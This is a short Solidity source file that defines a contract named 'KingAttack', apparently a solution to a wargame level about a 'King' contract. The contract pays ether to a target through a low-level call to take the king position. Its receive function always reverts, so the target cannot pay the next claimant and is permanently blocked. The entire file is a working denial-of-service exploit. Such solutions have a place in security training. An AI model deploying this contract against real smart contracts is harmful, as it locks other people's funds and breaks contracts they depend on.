// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    function attack(address payable target) public payable{
        //target.transfer(msg.value);
        (bool success,) = target.call{value:msg.value}("");
        require(success, "call failed");
    }

    receive() external payable {
        revert("You will not be king!");
    }
}